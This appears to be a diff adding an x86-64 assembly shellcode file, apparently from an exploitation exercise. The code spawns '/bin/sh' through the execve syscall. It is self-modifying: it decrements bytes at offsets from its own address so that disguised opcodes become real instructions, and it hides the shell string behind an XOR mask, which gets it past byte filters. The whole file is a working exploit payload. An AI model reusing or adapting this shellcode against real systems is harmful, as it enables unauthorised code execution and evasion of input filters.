@@ -1,0 +1,63 @@
+        BITS 64
+pop rcx;
+pop rcx;
+pop rcx;
+pop rcx;
+pop rcx;
+            ; rcx RDX and ~~rbp - 8h~~ contains the location to my shellcode in memory
+
+            dec dword [ rcx + 0xb ] ; unless overflow dword fine
+            dec dword [ rcx + 0xd ] ; unless overflow dword fine
+            db      0x49, 0x31, 0xD3 ; 4831D2 xor     rdx, rdx
+
+
+            dec dword [ rcx + 0x11 ] ; unless overflow dword fine
+;                          2f2f62696e2f7368
+;            mov     rbx, 0x2f2f63696f2f7369; 2f2f62696e2f7368 '//bin/sh'
+;mov rbx, '//bin/sh' ;
+;db word 0xbb48, qword 0x68732F6E69622f2f ; 0x2F2F62696E2F7368 ;qword '//bin/sh'
+ db word 0xbb49, qword 0x0169732F6f69632f ; 0x2F2F62696E2F7368 ;qword '//bin/sh'
+            ; gen mask below;xor     qword rbx,qword 0x0000010001000001;
+;xor rbx,        qword 0x0100000100010000;
+            xor r9,r9;
+            or r9, 1;
+            shl r9, 7
+            shl r9, 1
+            or r9, 1;
+            shl r9,23;
+            shl r9,1;
+            or r9, 1;
+            shl r9,15;
+            shl r9,1;
+            or r9, 1;
+            shl r9,7;
+            shl r9,1;
+            dec dword [ rcx + 0x4d ] ; unless overflow dword fine
+            db 0x4d, 0x31, 0xcb;xor rbx, r9;
+
+            push    rbx
+            dec dword [ rcx + 0x57 ] ; unless overflow dword fine
+not r11;
+           db 0x49, 0x89, 0xe7; mov     rdi, rsp
+            push    rdi ;push    rax; prob not but y not just to get rid of the byte
+            push    rdi
+            dec dword [ rcx + 0x65 ] ; unless overflow dword fine
+            dec dword [ rcx + 0x67 ] ; unless overflow dword fine
+not r11;
+            ;db 0x49, 0x89, 0xe7;;mov     rsi, rsp
+db 0x49, 0x89, 0xd7 ;  mov rsi, rdx;
+
+            dec dword [ rcx + 0x6b ] ; unless overflow dword fine
+            db 0xb1, 0x3b  ;mov     al, 0x3b ; rax is already 0
+
+
+            syscall
+
+
+;       db        "AAAA unused msg iiii"
+;message:db        "Hello, World", 10      ; note the newline at the end
+;ctr: db 64
+;magic: db 0b1000000, 0b0000000, 0b1000001
+
+
+
